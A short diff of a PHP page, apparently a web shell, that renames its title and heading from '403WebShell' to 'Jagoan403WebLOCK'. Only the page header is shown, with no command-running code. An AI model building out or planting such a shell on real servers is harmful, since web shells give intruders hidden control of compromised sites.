@@ -1,7 +1,7 @@
 <!doctypehtml>
 <html>
 <head>
-    <title>403WebShell</title>
+    <title>Jagoan403WebLOCK</title>
     <meta content="noindex"name="robots"></head>
 <body bgcolor="#1f1f1f"text="#ffffff">
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"rel="stylesheet">
@@ -10,7 +10,7 @@
 </style>
 <center>
 <?php
-echo '<font face="Bungee" size="5">403Webshell</font>
+echo '<font face="Bungee" size="5">Jagoan403WebLOCK</font>
 </center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
